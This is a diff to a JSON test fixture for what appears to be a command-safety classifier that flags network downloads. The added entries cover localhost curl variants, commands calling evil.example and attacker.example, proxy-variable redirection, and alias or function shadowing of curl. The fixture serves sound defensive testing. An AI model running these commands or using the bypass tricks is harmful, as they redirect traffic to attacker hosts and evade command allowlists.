@@ -7,7 +7,11 @@
     "curl -XPOST -so/dev/null HTTP://LOCALHOST/ 2>/dev/null",
     "curl --silent --max-time 2 localhost localhost:8080/b?q=1",
     "cd x && curl -s localhost:8080 && go test ./...",
-    "sudo /usr/bin/curl -s localhost"
+    "sudo /usr/bin/curl -s localhost",
+    "curl -s localhost:8080 # health check",
+    "curl http://localhost/#frag",
+    "curl localhost # then; curl https://evil.example",
+    "echo ok # curl https://evil.example"
   ],
   "download": {
     "curl -s https://evil.example": "curl",
@@ -43,6 +47,18 @@
     "echo https://evil.example | xargs curl localhost": "curl",
     "curl -s localhost:8080; curl https://evil.example": "curl",
     "wget -qO- localhost:8080": "wget",
-    "aria2c http://localhost/x": "aria2c"
+    "aria2c http://localhost/x": "aria2c",
+    "http_proxy=http://p.example:8080 curl http://localhost:6309": "curl",
+    "NO_PROXY= no_proxy= http_proxy=http://attacker.example:8080 curl http://localhost:6309": "curl",
+    "env ALL_PROXY=socks5://p.example curl localhost": "curl",
+    "export HTTPS_PROXY=http://p.example; curl localhost": "curl",
+    "FOO=1 curl localhost": "curl",
+    "PATH=/tmp/x:/usr/bin curl localhost": "curl",
+    "CURL_HOME=/tmp/x curl localhost": "curl",
+    "X=$(date) curl localhost": "curl",
+    "curl() { python3 fetch.py; }; curl http://localhost": "curl",
+    "function curl { python3 fetch.py; }; curl localhost": "curl",
+    "alias curl='python3 fetch.py'; curl localhost": "curl",
+    "curl localhost # note\ncurl https://evil.example": "curl"
   }
 }
